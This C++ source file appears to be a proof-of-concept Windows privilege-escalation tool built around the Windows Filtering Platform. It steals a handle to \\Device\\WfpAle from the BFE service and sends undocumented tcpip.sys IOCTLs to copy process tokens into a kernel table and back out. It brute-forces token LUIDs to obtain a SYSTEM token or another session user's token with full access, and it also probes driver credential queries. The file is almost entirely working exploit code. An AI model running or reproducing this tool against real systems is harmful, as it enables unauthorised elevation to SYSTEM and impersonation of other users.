#include "WfpClient.h"

constexpr ULONG g_SetTokenControlCode = 0x128000;
constexpr ULONG g_ReleaseTokenControlCode = 0x128004;
constexpr ULONG g_GetTokenControlCode = 0x124008;
constexpr ULONG g_ProcessExplicitCredentialQuery = 0x128010;
const wstring g_DeviceName = L"\\Device\\WfpAle";

WfpClient::WfpClient(DWORD SessionId) :
	m_EngineHandle(nullptr),
	m_DeviceHandle(nullptr),
	m_FwpsOpenToken0(nullptr),
	m_TargetUsername(L"NT AUTHORITY\\SYSTEM") // Search for a SYSTEM token, unless a session id is specified
{
	m_IPSecPolicyGuid = {};

	// Duplicate a handle to \Device\WfpAle from the handle table of the BFE service
	m_DeviceHandle = GetWfpAleHandle();

	// Open a handle to the BFE engine to configure an IPSec policy
	NTSTATUS status = FwpmEngineOpen0(nullptr, RPC_C_AUTHN_DEFAULT, nullptr, nullptr, &m_EngineHandle);
	if (!NT_SUCCESS(status))
		ThrowException("[WfpClient::WfpClient] FwpmEngineOpen0 failed", status);

	// Brute-forcing the LUID of a token can be done through RPC, but it is less efficient
	m_FwpsOpenToken0 = reinterpret_cast<FwpsOpenToken0>(GetProcAddress(GetModuleHandle(L"Fwpuclnt"), "FwpsOpenToken0"));
	if (nullptr == m_FwpsOpenToken0)
		ThrowException("[WfpClient::WfpClient] FwpsOpenToken0 not found", GetLastError());

	if (SessionId)
		m_TargetUsername.assign(GetUsernameFromSession(SessionId));
}

WfpClient::~WfpClient()
{
	CloseHandle(m_DeviceHandle);
	FwpmIPsecTunnelDeleteByKey0(m_EngineHandle, &m_IPSecPolicyGuid); // Remove IPSec policy
	FwpmEngineClose0(m_EngineHandle);
}

// Based on https://learn.microsoft.com/en-us/windows/win32/fwp/using-tunnel-mode
DWORD WfpClient::InstallIPSecPolicy(wstring PolicyName, GUID* ProviderKey, wstring LocalAddress, wstring RemoteAddress, wstring PreSharedKey)
{
	wcout << L"Creating IPSec policy:" << endl;
	wcout << L"[+] Policy name: " << PolicyName << endl;
	wcout << L"[+] Local address: " << LocalAddress << endl;
	wcout << L"[+] Remote address: " << RemoteAddress << endl;
	SOCKADDR localAddr = {};
	SOCKADDR remoteAddr = {};
	StringToSockAddr(LocalAddress, &localAddr);
	StringToSockAddr(RemoteAddress, &remoteAddr);

	FWP_BYTE_BLOB* preSharedKeyBlob;
	GenerateBlob(PreSharedKey, &preSharedKeyBlob);

	DWORD result = ERROR_SUCCESS;
	FWPM_FILTER_CONDITION0 filterConditions[2];
	IPSEC_TUNNEL_ENDPOINTS0 endpoints;
	IKEEXT_AUTHENTICATION_METHOD0 mmAuthMethods[1];
	IKEEXT_PROPOSAL0 mmProposals[1];
	IKEEXT_POLICY0 mmPolicy;
	FWPM_PROVIDER_CONTEXT0 mmProvCtxt;
	IPSEC_AUTH_AND_CIPHER_TRANSFORM0 qmTransform00;
	const IPSEC_SA_LIFETIME0 qmLifetime =
	{
	   3600,       // lifetimeSeconds
	   100000,     // lifetimeKilobytes
	   0x7FFFFFFF  // lifetimePackets
	};
	IPSEC_SA_TRANSFORM0 qmTransforms0[1];
	IPSEC_PROPOSAL0 qmProposals[1];
	IPSEC_TUNNEL_POLICY0 qmPolicy;
	FWPM_PROVIDER_CONTEXT0 qmProvCtxt;

	// Fill in the version-independent fields in the filter conditions.
	memset(filterConditions, 0, sizeof(filterConditions));
	filterConditions[0].fieldKey = FWPM_CONDITION_IP_LOCAL_ADDRESS;
	filterConditions[0].matchType = FWP_MATCH_EQUAL;
	filterConditions[1].fieldKey = FWPM_CONDITION_IP_REMOTE_ADDRESS;
	filterConditions[1].matchType = FWP_MATCH_EQUAL;

	// Do the version-dependent processing of the tunnel endpoints.
	if (localAddr.sa_family == AF_INET)
	{
		endpoints.ipVersion = FWP_IP_VERSION_V4;
		endpoints.localV4Address = ntohl(*(ULONG*)INETADDR_ADDRESS(&localAddr));
		endpoints.remoteV4Address = ntohl(*(ULONG*)INETADDR_ADDRESS(&remoteAddr));

		// For a point-to-point tunnel, the filter conditions are the same as the
		// tunnel endpoints. If this were a site-to-site tunnel, these would be
		// the local and remote subnets instead.
		filterConditions[0].conditionValue.type = FWP_UINT32;
		filterConditions[0].conditionValue.uint32 = endpoints.localV4Address;
		filterConditions[1].conditionValue.type = FWP_UINT32;
		filterConditions[1].conditionValue.uint32 = endpoints.remoteV4Address;
	}
	else
	{
		endpoints.ipVersion = FWP_IP_VERSION_V6;
		memcpy(
			endpoints.localV6Address,
			INETADDR_ADDRESS(&localAddr),
			sizeof(endpoints.localV6Address)
		);
		memcpy(
			endpoints.remoteV6Address,
			INETADDR_ADDRESS(&remoteAddr),
			sizeof(endpoints.remoteV6Address)
		);

		filterConditions[0].conditionValue.type = FWP_BYTE_ARRAY16_TYPE;
		filterConditions[0].conditionValue.byteArray16 =
			(FWP_BYTE_ARRAY16*)(endpoints.localV6Address);
		filterConditions[1].conditionValue.type = FWP_BYTE_ARRAY16_TYPE;
		filterConditions[1].conditionValue.byteArray16 =
			(FWP_BYTE_ARRAY16*)(endpoints.remoteV6Address);
	}

	// Main mode authentication uses a pre-shared key.
	memset(mmAuthMethods, 0, sizeof(mmAuthMethods));
	mmAuthMethods[0].authenticationMethodType = IKEEXT_PRESHARED_KEY;
	mmAuthMethods[0].presharedKeyAuthentication.presharedKey = *preSharedKeyBlob;

	// There is a single main mode proposal: AES-128/SHA-1 with 8 hour lifetime.
	memset(mmProposals, 0, sizeof(mmProposals));
	mmProposals[0].cipherAlgorithm.algoIdentifier = IKEEXT_CIPHER_AES_128;
	mmProposals[0].integrityAlgorithm.algoIdentifier = IKEEXT_INTEGRITY_SHA1;
	mmProposals[0].maxLifetimeSeconds = 8 * 60 * 60;
	mmProposals[0].dhGroup = IKEEXT_DH_GROUP_2;

	memset(&mmPolicy, 0, sizeof(mmPolicy));
	mmPolicy.numAuthenticationMethods = ARRAYSIZE(mmAuthMethods);
	mmPolicy.authenticationMethods = mmAuthMethods;
	mmPolicy.numIkeProposals = ARRAYSIZE(mmProposals);
	mmPolicy.ikeProposals = mmProposals;

	memset(&mmProvCtxt, 0, sizeof(mmProvCtxt));
	// For MUI compatibility, object names should be indirect strings. 
	// See SHLoadIndirectString for details.
	mmProvCtxt.displayData.name = PolicyName.data();
	// Link all our objects to our provider. When multiple providers are
	// installed on a computer, this makes it easy to determine who added what.
	mmProvCtxt.providerKey = ProviderKey;
	mmProvCtxt.type = FWPM_IPSEC_IKE_MM_CONTEXT;
	mmProvCtxt.authIpMmPolicy = &mmPolicy;

	// For quick mode use ESP authentication and cipher.
	memset(&qmTransform00, 0, sizeof(qmTransform00));
	qmTransform00.authTransform.authTransformId =
		IPSEC_AUTH_TRANSFORM_ID_HMAC_SHA_1_96;
	qmTransform00.cipherTransform.cipherTransformId =
		IPSEC_CIPHER_TRANSFORM_ID_AES_128;

	memset(qmTransforms0, 0, sizeof(qmTransforms0));
	qmTransforms0[0].ipsecTransformType = IPSEC_TRANSFORM_ESP_AUTH_AND_CIPHER;
	qmTransforms0[0].espAuthAndCipherTransform = &qmTransform00;

	memset(qmProposals, 0, sizeof(qmProposals));
	qmProposals[0].lifetime = qmLifetime;
	qmProposals[0].numSaTransforms = ARRAYSIZE(qmTransforms0);
	qmProposals[0].saTransforms = qmTransforms0;

	memset(&qmPolicy, 0, sizeof(qmPolicy));
	qmPolicy.numIpsecProposals = ARRAYSIZE(qmProposals);
	qmPolicy.ipsecProposals = qmProposals;
	qmPolicy.tunnelEndpoints = endpoints;
	qmPolicy.saIdleTimeout.idleTimeoutSeconds = 300;
	qmPolicy.saIdleTimeout.idleTimeoutSecondsFailOver = 60;

	memset(&qmProvCtxt, 0, sizeof(qmProvCtxt));
	qmProvCtxt.displayData.name = PolicyName.data();
	qmProvCtxt.providerKey = ProviderKey;
	qmProvCtxt.type = FWPM_IPSEC_IKE_QM_TUNNEL_CONTEXT;
	qmProvCtxt.ikeQmTunnelPolicy = &qmPolicy;
	UuidCreate(&qmProvCtxt.providerContextKey);

	result = FwpmIPsecTunnelAdd0(
		m_EngineHandle,
		FWPM_TUNNEL_FLAG_POINT_TO_POINT,
		&mmProvCtxt,
		&qmProvCtxt,
		ARRAYSIZE(filterConditions),
		filterConditions,
		NULL
	);

	if (result)
		ThrowException("[WfpClient::InstallIPSecPolicy] FwpmIPsecTunnelAdd0 failed", result);

	m_IPSecPolicyGuid = qmProvCtxt.providerContextKey;
	delete[] preSharedKeyBlob;
	return result;
}

wstring WfpClient::GetIPSecPolicyGuid()
{
	RPC_WSTR uuidRpcString;
	UuidToStringW(&m_IPSecPolicyGuid, &uuidRpcString);
	wstring uuidString(reinterpret_cast<wchar_t*>(uuidRpcString));
	RpcStringFreeW(&uuidRpcString);
	return uuidString;
}

HANDLE WfpClient::WfpDuplicateToken(const DWORD Pid, const HANDLE TokenHandle) const
{
	const LUID luid = SetToken(Pid, TokenHandle);
	const HANDLE duplicatedHandle = GetToken(luid);
	ReleaseToken(luid);
	if (INVALID_HANDLE_VALUE == duplicatedHandle)
		ThrowException("[WfpClient::WfpDuplicateToken] Getting token failed", STATUS_NOT_FOUND);
	return duplicatedHandle;
}

HANDLE WfpClient::BruteForceTable()
{
	wcout << L"Brute-forcing token LUID values" << endl;
	// highPart is always 0. This loop can be changed to brute force the highPart as well
	for (LONG highPart = 0; highPart <= 0; highPart++)
	{
		// Based on tests, the lowPart is less than 0x1000
		for (DWORD lowPart = 0; lowPart <= 0x1000; lowPart++)
		{
			const LUID luid = { lowPart, highPart };
			try
			{
				const HANDLE tokenHandle = GetToken(luid);
				if (tokenHandle != INVALID_HANDLE_VALUE)
				{
					wstring user;
					GetTokenUser(tokenHandle, user);
					wcout << L"LUID {" << std::hex << lowPart << L", " << highPart << std::dec << L"} returned token for " << user << endl;
					if (!user.compare(m_TargetUsername))
						return tokenHandle;
					CloseHandle(tokenHandle);
				}
			}
			catch (std::exception& ex)
			{
				wcout << L"LUID {" << std::hex << lowPart << L", " << highPart << std::dec << L"} raised exception: " << ex.what() << endl;
			}
		}
	}
	return nullptr;
}

LUID WfpClient::SetToken(DWORD Pid, HANDLE TokenHandle) const
{
	LUID luid;
	IO_STATUS_BLOCK statusBlock = {};
	SetTokenStruct setTokenStruct = { Pid , TokenHandle };
	
	// Send a message to tcpip to duplicate the token from the process specified by Pid and store it inside tcpip!gAleMasterHashTable
	NTSTATUS status = NtDeviceIoControlFile(m_DeviceHandle, nullptr, nullptr, nullptr, &statusBlock, g_SetTokenControlCode, &setTokenStruct, sizeof(SetTokenStruct), &luid, sizeof(LUID));
	if (!NT_SUCCESS(status))
		ThrowException("[WfpClient::WfpDuplicateToken] Setting token failed", status);

	return luid;
}

HANDLE WfpClient::GetToken(LUID Luid) const
{
	IO_STATUS_BLOCK statusBlock = {};

	// Send a message to tcpip to retrieve the token from tcpip!gAleMasterHashTable and send it to the current process
	HANDLE newToken;
#ifdef _WIN64
	NTSTATUS status = NtDeviceIoControlFile(m_DeviceHandle, nullptr, nullptr, nullptr, &statusBlock, g_GetTokenControlCode, &Luid, sizeof(LUID), &newToken, sizeof(HANDLE));
#else
	// The output buffer size has to be 8 bytes. For x86 executable, use "long long" and then cast it as handle
	long long outputBuffer;
	NTSTATUS status = NtDeviceIoControlFile(m_DeviceHandle, nullptr, nullptr, nullptr, &statusBlock, g_GetTokenControlCode, &Luid, sizeof(LUID), &outputBuffer, sizeof(outputBuffer));
	newToken = reinterpret_cast<HANDLE>(outputBuffer);
#endif

	// Convert the return value to be the same one as FwpsOpenToken0 returns for invalid LUID value 
	if (STATUS_NOT_FOUND == status)
		return INVALID_HANDLE_VALUE;

	// If any other error is returned, throw an exception to stop the brute-force
	if (!NT_SUCCESS(status))
		ThrowException("[WfpClient::WfpDuplicateToken] Getting token failed", status);

	// tcpip!WfpAleQueryTokenById calls ZwDuplicateToken with TOKEN_DUPLICATE as the desired access.
	// Call DuplicateHandle to get a handle with more access
	HANDLE duplicatedHandle;
	if (!DuplicateHandle(GetCurrentProcess(), newToken, GetCurrentProcess(), &duplicatedHandle, TOKEN_ALL_ACCESS, false, 0))
		ThrowException("[WfpClient::WfpDuplicateToken] DuplicateHandle failed", GetLastError());

	// Close the handle to the token with the low access
	CloseHandle(newToken);
	return duplicatedHandle;
}

void WfpClient::ReleaseToken(LUID Luid) const
{
	IO_STATUS_BLOCK statusBlock = {};

	// Send a message to tcpip to release the token from tcpip!gAleMasterHashTable
	NTSTATUS status = NtDeviceIoControlFile(m_DeviceHandle, nullptr, nullptr, nullptr, &statusBlock, g_ReleaseTokenControlCode, &Luid, sizeof(LUID), nullptr, 0);
	if (!NT_SUCCESS(status))
		ThrowException("[WfpClient::WfpDuplicateToken] Releasing token failed", status);
}

HANDLE WfpClient::GetWfpAleHandle()
{
	const DWORD bfePid = GetBfePid();
	return FindFileHandle(bfePid, g_DeviceName);
}

DWORD WfpClient::GetBfePid()
{
	return GetServicePid(L"bfe");
}

HANDLE WfpClient::FindFileHandle(const DWORD ProcessId, const wstring& FilePath)
{
	const ULONG fileHandleIndex = GetFileObjectIndex();
	HANDLE fileHandle = nullptr;

	ACCESS_MASK grantedAccess = FILE_GENERIC_READ | FILE_GENERIC_WRITE;
	const vector<HANDLE> handlesVector = GetHandlesFromProcess(ProcessId, fileHandleIndex, &grantedAccess);

	const HANDLE processHandle = OpenProcess(PROCESS_DUP_HANDLE, false, ProcessId);
	if (nullptr == processHandle)
		ThrowException("[GetWfpAleHandle] OpenProcess failed", GetLastError());

	// Iterate over each handle in the vector
	for (const auto& handle : handlesVector)
	{
		// The handle needs to be duplicated into the current process to work
		if (!DuplicateHandle(processHandle, handle, GetCurrentProcess(), &fileHandle, 0, FALSE, DUPLICATE_SAME_ACCESS))
		{
			CloseHandle(processHandle);
			ThrowException("[WfpClient::FindFileHandle] DuplicateHandle failed", GetLastError());
		}

		// Retrieve the name of the device from the handle
		const wstring fileNameWstring = GetPathFromHandle(fileHandle);
		if (!fileNameWstring.compare(FilePath))
		{
			CloseHandle(processHandle);
			wcout << L"Duplicating handle 0x" << std::hex << reinterpret_cast<ULONG_PTR>(handle) << std::dec << L" from BFE to access " << FilePath << endl;
			return fileHandle;
		}

		// Close the handle to any file that doesn't match the FilePath parameter
		CloseHandle(fileHandle);
	}
	CloseHandle(processHandle);
	ThrowException("[WfpClient::FindFileHandle] file handle not found", STATUS_NOT_FOUND);
}

ULONG WfpClient::GetFileObjectIndex()
{
	wchar_t fileName[MAX_PATH];
	if (!GetModuleFileNameW(GetModuleHandleW(nullptr), fileName, MAX_PATH))
		ThrowException("[WfpClient::GetFileObjectIndex] GetModuleFileNameW failed", GetLastError());

	const HANDLE fileHandle = CreateFileW(fileName, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (INVALID_HANDLE_VALUE == fileHandle)
		ThrowException("[WfpClient::GetFileObjectIndex] CreateFileW failed", GetLastError());

	const ULONG index = GetObjectIndex(fileHandle);
	CloseHandle(fileHandle);
	return index;
}

HANDLE WfpClient::QueryBfe(LUID Luid)
{
	// Send RPC call to the BFE service to retrieve a token from tpcip.sys with the specified LUID
	// The permission BFE has for the token is TOKEN_DUPLICATE. The duplication will fail if more permissions are required
	HANDLE token = INVALID_HANDLE_VALUE;
	NTSTATUS status = m_FwpsOpenToken0(m_EngineHandle, Luid, TOKEN_DUPLICATE, &token);

	if (INVALID_HANDLE_VALUE == token)
		return token;

	if (status)
		ThrowException("[WfpClient::QueryBfe] FwpsOpenToken0 failed", status);

	// The token needs to be duplicated to launch a new process
	if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenPrimary, &token))
		ThrowException("[WfpClient::QueryBfe] DuplicateTokenEx failed", GetLastError());

	return token;
}

// Based on FwpmGetAppIdFromFileName0, but without the limitation of accepting only file paths
void WfpClient::GenerateBlob(wstring PreSharedKey, FWP_BYTE_BLOB** Blob)
{
	// Allocate memory for a FWP_BYTE_BLOB struct, and the PreSharedKey
	DWORD stringSize = (PreSharedKey.size() + 1) * sizeof(wchar_t);
	DWORD bufferSize = sizeof(FWP_BYTE_BLOB) + stringSize;
	FWP_BYTE_BLOB* buffer = reinterpret_cast<FWP_BYTE_BLOB*>(new BYTE[bufferSize]);
	ZeroMemory(buffer, bufferSize);
	buffer->size = stringSize;

	// Find the address of the first byte after FWP_BYTE_BLOB ends
	PBYTE stringStart = reinterpret_cast<PBYTE>(&buffer[1]);
	memcpy(stringStart, PreSharedKey.c_str(), buffer->size);
	buffer->data = stringStart;
	*Blob = buffer;
}

NTSTATUS WfpClient::QueryCredentials(UINT64 Input)
{
	HANDLE tokenHandle = nullptr;
	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tokenHandle);

	// The BFE service performs access check on the client. SYSTEM is allowed
	if (IsSystemToken(tokenHandle))
	{
		auto pFwpsAleExplicitCredentialsQuery0 = reinterpret_cast<FwpsAleExplicitCredentialsQuery0>(GetProcAddress(GetModuleHandle(L"Fwpuclnt"), "FwpsAleExplicitCredentialsQuery0"));
		if (nullptr == pFwpsAleExplicitCredentialsQuery0)
			ThrowException("[WfpClient::WfpClient] FwpsAleExplicitCredentialsQuery0 not found", GetLastError());

		// The BFE service allocated the memory for the data returned from the driver
		void** credentialsArray;
		return pFwpsAleExplicitCredentialsQuery0(m_EngineHandle, Input, &credentialsArray);
	}

	// If the process is not executed as SYSTEM, the device IO can be sent directly and the memory must be allocated by the caller
	IO_STATUS_BLOCK statusBlock = {};
	DWORD outputBufferSize = 0x107FE;
	PBYTE outputBuffer = new BYTE[outputBufferSize];
	NTSTATUS status = NtDeviceIoControlFile(m_DeviceHandle, nullptr, nullptr, nullptr, &statusBlock, g_ProcessExplicitCredentialQuery, &Input, sizeof(UINT64), outputBuffer, outputBufferSize);
	delete[] outputBuffer;
	return status;
}